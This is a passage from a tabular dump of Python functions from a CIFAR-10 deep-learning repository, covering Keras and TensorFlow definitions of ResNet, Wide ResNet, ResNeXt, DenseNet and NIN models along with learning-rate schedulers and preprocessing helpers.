    model.add(Conv2D(192, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2), padding='same'))
    model.add(Dropout(dropout))
    model.add(Conv2D(192, (3, 3), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(Conv2D(192, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(Conv2D(10, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(GlobalAveragePooling2D())
    model.add(Activation('softmax'))
    sgd = optimizers.SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 80:
        return 0.1
    if epoch < 160:
        return 0.01
    return 0.001"
BIGBALLON/cifar-10-cnn,color_preprocessing,"def color_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    mean = [125.307, 122.95, 113.865]
    std = [62.9932, 62.0887, 66.7048]
    for i in range(3):
        x_train[:, :, :, i] = (x_train[:, :, :, i] - mean[i]) / std[i]
        x_test[:, :, :, i] = (x_test[:, :, :, i] - mean[i]) / std[i]
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 81:
        return 0.1
    if epoch < 122:
        return 0.01
    return 0.001"
BIGBALLON/cifar-10-cnn,residual_network,"def residual_network(img_input, classes_num=10, stack_n=5):

    def residual_block(x, o_filters, increase=False):
        stride = (1, 1)
        if increase:
            stride = (2, 2)
        o1 = Activation('relu')(BatchNormalization(momentum=0.9, epsilon=1e-05)(x))
        conv_1 = Conv2D(o_filters, kernel_size=(3, 3), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(o1)
        o2 = Activation('relu')(BatchNormalization(momentum=0.9, epsilon=1e-05)(conv_1))
        conv_2 = Conv2D(o_filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(o2)
        if increase:
            projection = Conv2D(o_filters, kernel_size=(1, 1), strides=(2, 2), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(o1)
            block = add([conv_2, projection])
        else:
            block = add([conv_2, x])
        return block
    x = Conv2D(filters=16, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(img_input)
    for _ in range(stack_n):
        x = residual_block(x, 16, False)
    x = residual_block(x, 32, True)
    for _ in range(1, stack_n):
        x = residual_block(x, 32, False)
    x = residual_block(x, 64, True)
    for _ in range(1, stack_n):
        x = residual_block(x, 64, False)
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    x = GlobalAveragePooling2D()(x)
    x = Dense(classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(x)
    return x"
BIGBALLON/cifar-10-cnn,residual_block,"def residual_block(x, o_filters, increase=False):
    stride = (1, 1)
    if increase:
        stride = (2, 2)
    o1 = Activation('relu')(BatchNormalization(momentum=0.9, epsilon=1e-05)(x))
    conv_1 = Conv2D(o_filters, kernel_size=(3, 3), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(o1)
    o2 = Activation('relu')(BatchNormalization(momentum=0.9, epsilon=1e-05)(conv_1))
    conv_2 = Conv2D(o_filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(o2)
    if increase:
        projection = Conv2D(o_filters, kernel_size=(1, 1), strides=(2, 2), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(o1)
        block = add([conv_2, projection])
    else:
        block = add([conv_2, x])
    return block"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 60:
        return 0.1
    if epoch < 120:
        return 0.02
    if epoch < 160:
        return 0.004
    return 0.0008"
BIGBALLON/cifar-10-cnn,color_preprocessing,"def color_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    mean = [125.3, 123.0, 113.9]
    std = [63.0, 62.1, 66.7]
    for i in range(3):
        x_train[:, :, :, i] = (x_train[:, :, :, i] - mean[i]) / std[i]
        x_test[:, :, :, i] = (x_test[:, :, :, i] - mean[i]) / std[i]
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,wide_residual_network,"def wide_residual_network(img_input, classes_num, depth, k):
    print('Wide-Resnet %dx%d' % (depth, k))
    n_filters = [16, 16 * k, 32 * k, 64 * k]
    n_stack = (depth - 4) // 6

    def conv3x3(x, filters):
        return Conv2D(filters=filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)

    def bn_relu(x):
        x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
        x = Activation('relu')(x)
        return x

    def residual_block(x, out_filters, increase=False):
        global IN_FILTERS
        stride = (1, 1)
        if increase:
            stride = (2, 2)
        o1 = bn_relu(x)
        conv_1 = Conv2D(out_filters, kernel_size=(3, 3), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(o1)
        o2 = bn_relu(conv_1)
        conv_2 = Conv2D(out_filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(o2)
        if increase or IN_FILTERS != out_filters:
            proj = Conv2D(out_filters, kernel_size=(1, 1), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(o1)
            block = add([conv_2, proj])
        else:
            block = add([conv_2, x])
        return block

    def wide_residual_layer(x, out_filters, increase=False):
        global IN_FILTERS
        x = residual_block(x, out_filters, increase)
        IN_FILTERS = out_filters
        for _ in range(1, int(n_stack)):
            x = residual_block(x, out_filters)
        return x
    x = conv3x3(img_input, n_filters[0])
    x = wide_residual_layer(x, n_filters[1])
    x = wide_residual_layer(x, n_filters[2], increase=True)
    x = wide_residual_layer(x, n_filters[3], increase=True)
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    x = AveragePooling2D((8, 8))(x)
    x = Flatten()(x)
    x = Dense(classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)
    return x"
BIGBALLON/cifar-10-cnn,conv3x3,"def conv3x3(x, filters):
    return Conv2D(filters=filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)"
BIGBALLON/cifar-10-cnn,bn_relu,"def bn_relu(x):
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    return x"
BIGBALLON/cifar-10-cnn,residual_block,"def residual_block(x, out_filters, increase=False):
    global IN_FILTERS
    stride = (1, 1)
    if increase:
        stride = (2, 2)
    o1 = bn_relu(x)
    conv_1 = Conv2D(out_filters, kernel_size=(3, 3), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(o1)
    o2 = bn_relu(conv_1)
    conv_2 = Conv2D(out_filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(o2)
    if increase or IN_FILTERS != out_filters:
        proj = Conv2D(out_filters, kernel_size=(1, 1), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(o1)
        block = add([conv_2, proj])
    else:
        block = add([conv_2, x])
    return block"
BIGBALLON/cifar-10-cnn,wide_residual_layer,"def wide_residual_layer(x, out_filters, increase=False):
    global IN_FILTERS
    x = residual_block(x, out_filters, increase)
    IN_FILTERS = out_filters
    for _ in range(1, int(n_stack)):
        x = residual_block(x, out_filters)
    return x"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 150:
        return 0.1
    if epoch < 225:
        return 0.01
    return 0.001"
BIGBALLON/cifar-10-cnn,resnext,"def resnext(img_input, classes_num):
    global IN_PLANES

    def bn_relu(x):
        x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
        x = Activation('relu')(x)
        return x

    def group_conv(x, planes, stride):
        h = planes // CARDINALITY
        groups = []
        for i in range(CARDINALITY):
            group = Lambda(lambda z: z[:, :, :, i * h:i * h + h])(x)
            groups.append(Conv2D(h, kernel_size=(3, 3), strides=stride, kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), padding='same', use_bias=False)(group))
        x = concatenate(groups)
        return x

    def residual_block(x, planes, stride=(1, 1)):
        D = int(math.floor(planes * (BASE_WIDTH / 64.0)))
        C = CARDINALITY
        shortcut = x
        y = Conv2D(D * C, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(shortcut)
        y = bn_relu(y)
        y = group_conv(y, D * C, stride)
        y = bn_relu(y)
        y = Conv2D(planes * 4, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(y)
        y = bn_relu(y)
        if stride != (1, 1) or IN_PLANES != planes * 4:
            shortcut = Conv2D(planes * 4, kernel_size=(1, 1), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)
            shortcut = BatchNormalization(momentum=0.9, epsilon=1e-05)(shortcut)
        y = add([y, shortcut])
        y = Activation('relu')(y)
        return y

    def residual_layer(x, blocks, planes, stride=(1, 1)):
        x = residual_block(x, planes, stride)
        IN_PLANES = planes * 4
        for i in range(1, blocks):
            x = residual_block(x, planes)
        return x

    def conv3x3(x, filters):
        x = Conv2D(filters=filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)
        x = bn_relu(x)
        return x

    def dense_layer(x):
        return Dense(classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)
    x = conv3x3(img_input, 64)
    x = residual_layer(x, 3, 64)
    x = residual_layer(x, 3, 128, stride=(2, 2))
    x = residual_layer(x, 3, 256, stride=(2, 2))
    x = GlobalAveragePooling2D()(x)
    x = dense_layer(x)
    return x"
BIGBALLON/cifar-10-cnn,bn_relu,"def bn_relu(x):
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    return x"
BIGBALLON/cifar-10-cnn,group_conv,"def group_conv(x, planes, stride):
    h = planes // CARDINALITY
    groups = []
    for i in range(CARDINALITY):
        group = Lambda(lambda z: z[:, :, :, i * h:i * h + h])(x)
        groups.append(Conv2D(h, kernel_size=(3, 3), strides=stride, kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), padding='same', use_bias=False)(group))
    x = concatenate(groups)
    return x"
BIGBALLON/cifar-10-cnn,residual_block,"def residual_block(x, planes, stride=(1, 1)):
    D = int(math.floor(planes * (BASE_WIDTH / 64.0)))
    C = CARDINALITY
    shortcut = x
    y = Conv2D(D * C, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(shortcut)
    y = bn_relu(y)
    y = group_conv(y, D * C, stride)
    y = bn_relu(y)
    y = Conv2D(planes * 4, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(y)
    y = bn_relu(y)
    if stride != (1, 1) or IN_PLANES != planes * 4:
        shortcut = Conv2D(planes * 4, kernel_size=(1, 1), strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)
        shortcut = BatchNormalization(momentum=0.9, epsilon=1e-05)(shortcut)
    y = add([y, shortcut])
    y = Activation('relu')(y)
    return y"
BIGBALLON/cifar-10-cnn,residual_layer,"def residual_layer(x, blocks, planes, stride=(1, 1)):
    x = residual_block(x, planes, stride)
    IN_PLANES = planes * 4
    for i in range(1, blocks):
        x = residual_block(x, planes)
    return x"
BIGBALLON/cifar-10-cnn,conv3x3,"def conv3x3(x, filters):
    x = Conv2D(filters=filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)
    x = bn_relu(x)
    return x"
BIGBALLON/cifar-10-cnn,dense_layer,"def dense_layer(x):
    return Dense(classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=l2(WEIGHT_DECAY), use_bias=False)(x)"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 150:
        return 0.1
    if epoch < 225:
        return 0.01
    return 0.001"
BIGBALLON/cifar-10-cnn,densenet,"def densenet(img_input, classes_num):

    def conv(x, out_filters, k_size):
        return Conv2D(filters=out_filters, kernel_size=k_size, strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)

    def dense_layer(x):
        return Dense(units=classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(x)

    def bn_relu(x):
        x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
        x = Activation('relu')(x)
        return x

    def bottleneck(x):
        channels = growth_rate * 4
        x = bn_relu(x)
        x = conv(x, channels, (1, 1))
        x = bn_relu(x)
        x = conv(x, growth_rate, (3, 3))
        return x

    def single(x):
        x = bn_relu(x)
        x = conv(x, growth_rate, (3, 3))
        return x

    def transition(x, inchannels):
        outchannels = int(inchannels * compression)
        x = bn_relu(x)
        x = conv(x, outchannels, (1, 1))
        x = AveragePooling2D((2, 2), strides=(2, 2))(x)
        return (x, outchannels)

    def dense_block(x, blocks, nchannels):
        concat = x
        for i in range(blocks):
            x = bottleneck(concat)
            concat = concatenate([x, concat], axis=-1)
            nchannels += growth_rate
        return (concat, nchannels)
    nblocks = (depth - 4) // 6
    nchannels = growth_rate * 2
    x = conv(img_input, nchannels, (3, 3))
    (x, nchannels) = dense_block(x, nblocks, nchannels)
    (x, nchannels) = transition(x, nchannels)
    (x, nchannels) = dense_block(x, nblocks, nchannels)
    (x, nchannels) = transition(x, nchannels)
    (x, nchannels) = dense_block(x, nblocks, nchannels)
    x = bn_relu(x)
    x = GlobalAveragePooling2D()(x)
    x = dense_layer(x)
    return x"
BIGBALLON/cifar-10-cnn,conv,"def conv(x, out_filters, k_size):
    return Conv2D(filters=out_filters, kernel_size=k_size, strides=(1, 1), padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)"
BIGBALLON/cifar-10-cnn,dense_layer,"def dense_layer(x):
    return Dense(units=classes_num, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(x)"
BIGBALLON/cifar-10-cnn,bn_relu,"def bn_relu(x):
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    return x"
BIGBALLON/cifar-10-cnn,bottleneck,"def bottleneck(x):
    channels = growth_rate * 4
    x = bn_relu(x)
    x = conv(x, channels, (1, 1))
    x = bn_relu(x)
    x = conv(x, growth_rate, (3, 3))
    return x"
BIGBALLON/cifar-10-cnn,single,"def single(x):
    x = bn_relu(x)
    x = conv(x, growth_rate, (3, 3))
    return x"
BIGBALLON/cifar-10-cnn,transition,"def transition(x, inchannels):
    outchannels = int(inchannels * compression)
    x = bn_relu(x)
    x = conv(x, outchannels, (1, 1))
    x = AveragePooling2D((2, 2), strides=(2, 2))(x)
    return (x, outchannels)"
BIGBALLON/cifar-10-cnn,dense_block,"def dense_block(x, blocks, nchannels):
    concat = x
    for i in range(blocks):
        x = bottleneck(concat)
        concat = concatenate([x, concat], axis=-1)
        nchannels += growth_rate
    return (concat, nchannels)"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 150:
        return 0.1
    if epoch < 225:
        return 0.01
    return 0.001"
BIGBALLON/cifar-10-cnn,resnext,"def resnext(img_input, classes_num):
    global inplanes

    def add_common_layer(x):
        x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
        x = Activation('relu')(x)
        return x

    def group_conv(x, planes, stride):
        h = planes // cardinality
        groups = []
        for i in range(cardinality):
            group = Lambda(lambda z: z[:, :, :, i * h:i * h + h])(x)
            groups.append(Conv2D(h, kernel_size=(3, 3), strides=stride, kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), padding='same', use_bias=False)(group))
        x = concatenate(groups)
        return x

    def residual_block(x, planes, stride=(1, 1)):
        D = int(math.floor(planes * (base_width / 64.0)))
        C = cardinality
        shortcut = x
        y = Conv2D(D * C, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(shortcut)
        y = add_common_layer(y)
        y = group_conv(y, D * C, stride)
        y = add_common_layer(y)
        y = Conv2D(planes * expansion, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(y)
        y = add_common_layer(y)
        if stride != (1, 1) or inplanes != planes * expansion:
            shortcut = Conv2D(planes * expansion, kernel_size=(1, 1), strides=stride, padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
            shortcut = BatchNormalization(momentum=0.9, epsilon=1e-05)(shortcut)
        y = squeeze_excite_block(y)
        y = add([y, shortcut])
        y = Activation('relu')(y)
        return y

    def residual_layer(x, blocks, planes, stride=(1, 1)):
        x = residual_block(x, planes, stride)
        inplanes = planes * expansion
        for i in range(1, blocks):
            x = residual_block(x, planes)
        return x

    def squeeze_excite_block(input, ratio=16):
        init = input
        channel_axis = 1 if K.image_data_format() == 'channels_first' else -1
        filters = init._keras_shape[channel_axis]
        se_shape = (1, 1, filters) if K.image_data_format() == 'channels_last' else (filters, 1, 1)
        se = GlobalAveragePooling2D()(init)
        se = Reshape(se_shape)(se)
        se = Dense(filters // ratio, activation='relu', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(se)
        se = Dense(filters, activation='sigmoid', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(se)
        x = multiply([init, se])
        return x

    def conv3x3(x, filters):
        x = Conv2D(filters=filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
        return add_common_layer(x)

    def dense_layer(x):
        return Dense(classes_num, activation='softmax', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay))(x)
    x = conv3x3(img_input, 64)
    x = residual_layer(x, 3, 64)
    x = residual_layer(x, 3, 128, stride=(2, 2))
    x = residual_layer(x, 3, 256, stride=(2, 2))
    x = GlobalAveragePooling2D()(x)
    x = dense_layer(x)
    return x"
BIGBALLON/cifar-10-cnn,add_common_layer,"def add_common_layer(x):
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    x = Activation('relu')(x)
    return x"
BIGBALLON/cifar-10-cnn,group_conv,"def group_conv(x, planes, stride):
    h = planes // cardinality
    groups = []
    for i in range(cardinality):
        group = Lambda(lambda z: z[:, :, :, i * h:i * h + h])(x)
        groups.append(Conv2D(h, kernel_size=(3, 3), strides=stride, kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), padding='same', use_bias=False)(group))
    x = concatenate(groups)
    return x"
BIGBALLON/cifar-10-cnn,residual_block,"def residual_block(x, planes, stride=(1, 1)):
    D = int(math.floor(planes * (base_width / 64.0)))
    C = cardinality
    shortcut = x
    y = Conv2D(D * C, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(shortcut)
    y = add_common_layer(y)
    y = group_conv(y, D * C, stride)
    y = add_common_layer(y)
    y = Conv2D(planes * expansion, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(y)
    y = add_common_layer(y)
    if stride != (1, 1) or inplanes != planes * expansion:
        shortcut = Conv2D(planes * expansion, kernel_size=(1, 1), strides=stride, padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
        shortcut = BatchNormalization(momentum=0.9, epsilon=1e-05)(shortcut)
    y = squeeze_excite_block(y)
    y = add([y, shortcut])
    y = Activation('relu')(y)
    return y"
BIGBALLON/cifar-10-cnn,residual_layer,"def residual_layer(x, blocks, planes, stride=(1, 1)):
    x = residual_block(x, planes, stride)
    inplanes = planes * expansion
    for i in range(1, blocks):
        x = residual_block(x, planes)
    return x"
BIGBALLON/cifar-10-cnn,squeeze_excite_block,"def squeeze_excite_block(input, ratio=16):
    init = input
    channel_axis = 1 if K.image_data_format() == 'channels_first' else -1
    filters = init._keras_shape[channel_axis]
    se_shape = (1, 1, filters) if K.image_data_format() == 'channels_last' else (filters, 1, 1)
    se = GlobalAveragePooling2D()(init)
    se = Reshape(se_shape)(se)
    se = Dense(filters // ratio, activation='relu', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(se)
    se = Dense(filters, activation='sigmoid', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(se)
    x = multiply([init, se])
    return x"
BIGBALLON/cifar-10-cnn,conv3x3,"def conv3x3(x, filters):
    x = Conv2D(filters=filters, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
    return add_common_layer(x)"
BIGBALLON/cifar-10-cnn,dense_layer,"def dense_layer(x):
    return Dense(classes_num, activation='softmax', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay))(x)"
BIGBALLON/cifar-10-cnn,slice_batch,"def slice_batch(x, n_gpus, part):
    sh = K.shape(x)
    L = sh[0] // n_gpus
    if part == n_gpus - 1:
        return x[part * L:]
    return x[part * L:(part + 1) * L]"
BIGBALLON/cifar-10-cnn,to_multi_gpu,"def to_multi_gpu(model, n_gpus=2):
    if n_gpus == 1:
        return model
    with tf.device('/cpu:0'):
        x = Input(model.input_shape[1:])
    towers = []
    for g in range(n_gpus):
        with tf.device('/gpu:' + str(g)):
            slice_g = Lambda(slice_batch, lambda shape: shape, arguments={'n_gpus': n_gpus, 'part': g})(x)
            towers.append(model(slice_g))
    with tf.device('/cpu:0'):
        merged = Concatenate(axis=0)(towers)
    return Model(inputs=[x], outputs=merged)"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch <= 75:
        return 0.1
    if epoch <= 150:
        return 0.01
    if epoch <= 210:
        return 0.001
    return 0.0005"
BIGBALLON/cifar-10-cnn,densenet,"def densenet(img_input, classes_num):

    def bn_relu(x):
        x = BatchNormalization()(x)
        x = Activation('relu')(x)
        return x

    def bottleneck(x):
        channels = growth_rate * 4
        x = bn_relu(x)
        x = Conv2D(channels, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
        x = bn_relu(x)
        x = Conv2D(growth_rate, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
        return x

    def single(x):
        x = bn_relu(x)
        x = Conv2D(growth_rate, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
        return x

    def transition(x, inchannels):
        outchannels = int(inchannels * compression)
        x = bn_relu(x)
        x = Conv2D(outchannels, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
        x = AveragePooling2D((2, 2), strides=(2, 2))(x)
        return (x, outchannels)

    def dense_block(x, blocks, nchannels):
        concat = x
        for i in range(blocks):
            x = bottleneck(concat)
            concat = concatenate([x, concat], axis=-1)
            nchannels += growth_rate
        return (concat, nchannels)

    def dense_layer(x):
        return Dense(classes_num, activation='softmax', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay))(x)
    nblocks = (depth - 4) // 6
    nchannels = growth_rate * 2
    x = Conv2D(nchannels, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(img_input)
    (x, nchannels) = dense_block(x, nblocks, nchannels)
    (x, nchannels) = transition(x, nchannels)
    (x, nchannels) = dense_block(x, nblocks, nchannels)
    (x, nchannels) = transition(x, nchannels)
    (x, nchannels) = dense_block(x, nblocks, nchannels)
    (x, nchannels) = transition(x, nchannels)
    x = bn_relu(x)
    x = GlobalAveragePooling2D()(x)
    x = dense_layer(x)
    return x"
BIGBALLON/cifar-10-cnn,bn_relu,"def bn_relu(x):
    x = BatchNormalization()(x)
    x = Activation('relu')(x)
    return x"
BIGBALLON/cifar-10-cnn,bottleneck,"def bottleneck(x):
    channels = growth_rate * 4
    x = bn_relu(x)
    x = Conv2D(channels, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
    x = bn_relu(x)
    x = Conv2D(growth_rate, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
    return x"
BIGBALLON/cifar-10-cnn,single,"def single(x):
    x = bn_relu(x)
    x = Conv2D(growth_rate, kernel_size=(3, 3), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
    return x"
BIGBALLON/cifar-10-cnn,transition,"def transition(x, inchannels):
    outchannels = int(inchannels * compression)
    x = bn_relu(x)
    x = Conv2D(outchannels, kernel_size=(1, 1), strides=(1, 1), padding='same', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay), use_bias=False)(x)
    x = AveragePooling2D((2, 2), strides=(2, 2))(x)
    return (x, outchannels)"
BIGBALLON/cifar-10-cnn,dense_block,"def dense_block(x, blocks, nchannels):
    concat = x
    for i in range(blocks):
        x = bottleneck(concat)
        concat = concatenate([x, concat], axis=-1)
        nchannels += growth_rate
    return (concat, nchannels)"
BIGBALLON/cifar-10-cnn,dense_layer,"def dense_layer(x):
    return Dense(classes_num, activation='softmax', kernel_initializer=he_normal(), kernel_regularizer=regularizers.l2(weight_decay))(x)"
BIGBALLON/cifar-10-cnn,conv,"def conv(x, shape, use_bias=True, std=0.05):
    random_initializer = tf.random_normal_initializer(stddev=std)
    W = tf.get_variable('weights', shape=shape, initializer=random_initializer)
    b = tf.get_variable('bias', shape=[shape[3]], initializer=tf.zeros_initializer)
    x = tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')
    if use_bias:
        x = tf.nn.bias_add(x, b)
    return x"
BIGBALLON/cifar-10-cnn,activation,"def activation(x):
    return tf.nn.relu(x)"
BIGBALLON/cifar-10-cnn,max_pool,"def max_pool(input, k_size=3, stride=2):
    return tf.nn.max_pool(input, ksize=[1, k_size, k_size, 1], strides=[1, stride, stride, 1], padding='SAME')"
BIGBALLON/cifar-10-cnn,global_avg_pool,"def global_avg_pool(input, k_size=1, stride=1):
    return tf.nn.avg_pool(input, ksize=[1, k_size, k_size, 1], strides=[1, stride, stride, 1], padding='VALID')"
BIGBALLON/cifar-10-cnn,learning_rate_schedule,"def learning_rate_schedule(epoch_num):
    if epoch_num < 81:
        return 0.05
    elif epoch_num < 121:
        return 0.01
    else:
        return 0.001"
BIGBALLON/cifar-10-cnn,main,"def main(_):
    (train_x, train_y, test_x, test_y) = prepare_data()
    (train_x, test_x) = color_preprocessing(train_x, test_x)
    with tf.name_scope('input'):
        x = tf.placeholder(tf.float32, [None, image_size, image_size, 3], name='input_x')
        y_ = tf.placeholder(tf.float32, [None, class_num], name='input_y')
    with tf.name_scope('keep_prob'):
        keep_prob = tf.placeholder(tf.float32)
    with tf.name_scope('learning_rate'):
        learning_rate = tf.placeholder(tf.float32)
    with tf.variable_scope('conv1'):
        output = conv(x, [5, 5, 3, 192], std=0.01)
        output = activation(output)
    with tf.variable_scope('mlp1-1'):
        output = conv(output, [1, 1, 192, 160])
        output = activation(output)
    with tf.variable_scope('mlp1-2'):
        output = conv(output, [1, 1, 160, 96])
        output = activation(output)
    with tf.name_scope('max_pool-1'):
        output = max_pool(output, 3, 2)
    with tf.name_scope('dropout-1'):
        output = tf.nn.dropout(output, keep_prob)
    with tf.variable_scope('conv2'):
        output = conv(output, [5, 5, 96, 192])
        output = activation(output)
    with tf.variable_scope('mlp2-1'):
        output = conv(output, [1, 1, 192, 192])
        output = activation(output)
    with tf.variable_scope('mlp2-2'):
        output = conv(output, [1, 1, 192, 192])
